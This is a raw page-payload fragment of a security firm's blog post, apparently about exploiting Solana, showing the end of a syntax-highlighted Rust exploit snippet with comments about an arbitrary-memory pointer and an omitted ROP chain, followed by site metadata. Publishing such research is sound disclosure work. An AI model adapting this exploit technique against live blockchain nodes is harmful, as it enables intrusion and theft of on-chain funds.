token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\n1170:[\"$\",\"span\",\"code-segment-755\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1171:[\"$\",\"span\",\"code-segment-756\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x4b8\"]}]\n1172:[\"$\",\"span\",\"code-segment-757\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1173:[\"$\",\"span\",\"code-segment-758\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1174:[\"$\",\"span\",\"code-segment-759\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n1175:[\"$\",\"span\",\"code-segment-760\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1176:[\"$\",\"span\",\"code-segment-761\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n1177:[\"$\",\"span\",\"code-segment-762\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n1178:[\"$\",\"span\",\"code-segment-763\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1179:[\"$\",\"span\",\"code-segment-764\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n117a:[\"$\",\"span\",\"code-segment-765\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n117b:[\"$\",\"span\""])</script><script>self.__next_f.push([1,",\"code-segment-766\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n117c:[\"$\",\"span\",\"code-segment-767\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n117d:[\"$\",\"span\",\"code-segment-768\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n117e:[\"$\",\"span\",\"code-segment-769\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\n117f:[\"$\",\"span\",\"code-segment-770\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n1180:[\"$\",\"span\",\"code-segment-771\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1181:[\"$\",\"span\",\"line-number--75\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[75]}]\n1182:[\"$\",\"span\",\"line-number--76\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[76]}]\n1183:[\"$\",\"span\",\"code-segment-775\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n1184:[\"$\",\"span\",\"code-segment-776\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// At this point, arb_ptr (accounts[pointer_idx]) points to arbitrary memory.\"]}]\n1185:[\"$\",\"span\",\"code-segment-777\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1186:[\"$\",\"span\",\"line-number--77\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[77]}]\n1187:[\"$\",\"span\",\"code-segment-779\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n1188:[\"$\",\"span\","])</script><script>self.__next_f.push([1,"\"code-segment-780\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// ROP chain setup would occur here (omitted).\"]}]\n1189:[\"$\",\"span\",\"code-segment-781\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n118a:[\"$\",\"span\",\"line-number--78\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[78]}]\n118b:[\"$\",\"span\",\"line-number--79\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[79]}]\n118c:[\"$\",\"span\",\"code-segment-785\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n118d:[\"$\",\"span\",\"code-segment-786\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"return\"]}]\n118e:[\"$\",\"span\",\"code-segment-787\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n118f:[\"$\",\"span\",\"code-segment-788\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}]\n1190:[\"$\",\"span\",\"code-segment-789\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n1191:[\"$\",\"span\",\"code-segment-790\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n1192:[\"$\",\"span\",\"code-segment-791\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1193:[\"$\",\"span\",\"code-segment-792\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1194:[\"$\",\"span\",\"code-segment-793\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n1195:[\"$\",\"span\",\"code-segment-794\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1196:[\"$\",\"span\",\"line-number--80\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\""])</script><script>self.__next_f.push([1,"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[80]}]\n1197:[\"$\",\"span\",\"code-segment-796\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n1198:[\"$\",\"span\",\"code-segment-797\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n1199:[\"$\",\"span\",\"code-segment-798\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n119a:[\"$\",\"span\",\"line-number--81\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[81]}]\n119b:[\"$\",\"span\",\"line-number--82\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[82]}]\n119c:[\"$\",\"span\",\"code-segment-802\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n119d:[\"$\",\"span\",\"code-segment-803\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Move to next potential MemoryRegion structure\"]}]\n119e:[\"$\",\"span\",\"code-segment-804\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n119f:[\"$\",\"span\",\"line-number--83\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[83]}]\n11a0:[\"$\",\"span\",\"code-segment-806\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                data_ptr \"]}]\n11a1:[\"$\",\"span\",\"code-segment-807\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+=\"]}]\n11a2:[\"$\",\"span\",\"code-segment-80"])</script><script>self.__next_f.push([1,"8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n11a3:[\"$\",\"span\",\"code-segment-809\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n11a4:[\"$\",\"span\",\"code-segment-810\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n11a5:[\"$\",\"span\",\"code-segment-811\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n11a6:[\"$\",\"span\",\"code-segment-812\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n11a7:[\"$\",\"span\",\"code-segment-813\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}]\n11a8:[\"$\",\"span\",\"code-segment-814\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\n11a9:[\"$\",\"span\",\"code-segment-815\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n11aa:[\"$\",\"span\",\"code-segment-816\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x08\"]}]\n11ab:[\"$\",\"span\",\"code-segment-817\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n11ac:[\"$\",\"span\",\"code-segment-818\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n11ad:[\"$\",\"span\",\"code-segment-819\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n11ae:[\"$\",\"span\",\"code-segment-820\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n11af:[\"$\",\"span\",\"code-segment-821\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n11b0:[\"$\",\"span\",\"code-segment-822\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\n11b1:[\"$\",\"span\",\"code-segment-823\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n11b2:[\"$\",\"span\",\"code-segment-824\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n11b3:[\"$\",\"span\",\"code-segment-825\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n11b4:[\"$\",\"span\",\"code-segment-826\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n11b5:[\"$\",\"span\",\"code-segment-827\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\n11b"])</script><script>self.__next_f.push([1,"6:[\"$\",\"span\",\"code-segment-828\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n11b7:[\"$\",\"span\",\"code-segment-829\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"4\"]}]\n11b8:[\"$\",\"span\",\"code-segment-830\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n11b9:[\"$\",\"span\",\"code-segment-831\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n11ba:[\"$\",\"span\",\"code-segment-832\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\u003c\"]}]\n11bb:[\"$\",\"span\",\"code-segment-833\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n11bc:[\"$\",\"span\",\"code-segment-834\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"4\"]}]\n11bd:[\"$\",\"span\",\"code-segment-835\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n11be:[\"$\",\"span\",\"code-segment-836\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n11bf:[\"$\",\"span\",\"line-number--84\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[84]}]\n11c0:[\"$\",\"span\",\"code-segment-838\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n11c1:[\"$\",\"span\",\"code-segment-839\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n11c2:[\"$\",\"span\",\"code-segment-840\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n11c3:[\"$\",\"span\",\"line-number--85\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[85]}]\n11c4:[\"$\",\"span\",\"code-segment-842\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n11c5:[\"$\",\"span\",\"code-segment-843\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}"])</script><script>self.__next_f.push([1,"]\n11c6:[\"$\",\"span\",\"code-segment-844\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n11c7:[\"$\",\"span\",\"line-number--86\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[86]}]\n11c8:[\"$\",\"span\",\"line-number--87\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[87]}]\n11c9:[\"$\",\"span\",\"code-segment-848\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n11ca:[\"$\",\"span\",\"code-segment-849\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Note: computation budget exhaustion may be necessary in real-world scenarios\"]}]\n11cb:[\"$\",\"span\",\"code-segment-850\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n11cc:[\"$\",\"span\",\"line-number--88\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[88]}]\n11cd:[\"$\",\"span\",\"code-segment-852\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n11ce:[\"$\",\"span\",\"code-segment-853\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n11cf:[\"$\",\"span\",\"code-segment-854\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n11d0:[\"$\",\"span\",\"line-number--89\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[89]}]\n11d1:[\"$\",\"span\",\"lin"])</script><script>self.__next_f.push([1,"e-number--90\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[90]}]\n11d2:[\"$\",\"span\",\"code-segment-858\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n11d3:[\"$\",\"span\",\"code-segment-859\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}]\n11d4:[\"$\",\"span\",\"code-segment-860\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n11d5:[\"$\",\"span\",\"code-segment-861\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n11d6:[\"$\",\"span\",\"code-segment-862\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n11d7:[\"$\",\"span\",\"code-segment-863\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n11d8:[\"$\",\"span\",\"code-segment-864\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n11d9:[\"$\",\"span\",\"line-number--91\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[91]}]\n11da:[\"$\",\"span\",\"code-segment-866\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n11db:[\"$\",\"span\",\"code-segment-867\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n11dc:[\"$\",\"span\",\"code-segment-868\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n11dd:[\"$\",\"span\",\"line-number--92\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[92]}]\n"])</script><script>self.__next_f.push([1,"a:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n6:null\n"])</script><script>self.__next_f.push([1,"11e0:I[622,[],\"IconMark\"]\n"])</script><script>self.__next_f.push([1,"8:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"Anatomist Security – Web3 / Blockchain Audit Experts\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Seasoned security researchers providing deep‑dive smart‑contract \u0026 blockchain infrastructure audits, fuzzing and consulting.\"}],[\"$\",\"meta\",\"2\",{\"name\":\"keywords\",\"content\":\"smart contract audit,blockchain security,web3,eth,solidity,vyper,solana,audit,pentest\"}],[\"$\",\"link\",\"3\",{\"rel\":\"canonical\",\"href\":\"https://anatomi.st/blog/2025_06_27_pwning_solana_for_fun_and_profit\"}],[\"$\",\"meta\",\"4\",{\"property\":\"og:title\",\"content\":\"Anatomist Security – Web3 Audit Experts\"}],[\"$\",\"meta\",\"5\",{\"property\":\"og:description\",\"content\":\"Battle‑tested researchers securing billions in on‑chain value.\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:url\",\"content\":\"https://anatomi.st\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:site_name\",\"content\":\"Anatomist Security\"}],[\"$\",\"meta\",\"8\",{\"property\":\"og:locale\",\"content\":\"en_US\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:image\",\"content\":\"https://anatomi.st/og-cover.png\"}],[\"$\",\"meta\",\"10\",{\"property\":\"og:type\",\"content\":\"website\"}],[\"$\",\"meta\",\"11\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"12\",{\"name\":\"twitter:site\",\"content\":\"@th3anatomist\"}],[\"$\",\"meta\",\"13\",{\"name\":\"twitter:creator\",\"content\":\"@th3anatomist\"}],[\"$\",\"meta\",\"14\",{\"name\":\"twitter:title\",\"content\":\"Anatomist Security – Web3 Audit Experts\"}],[\"$\",\"meta\",\"15\",{\"name\":\"twitter:description\",\"content\":\"Battle‑tested researchers securing billions in on‑chain value.\"}],[\"$\",\"meta\",\"16\",{\"name\":\"twitter:image\",\"content\":\"https://anatomi.st/og-cover.png\"}],[\"$\",\"link\",\"17\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"32x32\"}],[\"$\",\"link\",\"18\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\"}],[\"$\",\"$L11e0\",\"19\",{}]],\"error\":null,\"digest\":\"$undefined\"}\n"])</script><script>self.__next_f.push([1,"d:\"$8:metadata\"\n"])</script></body></html>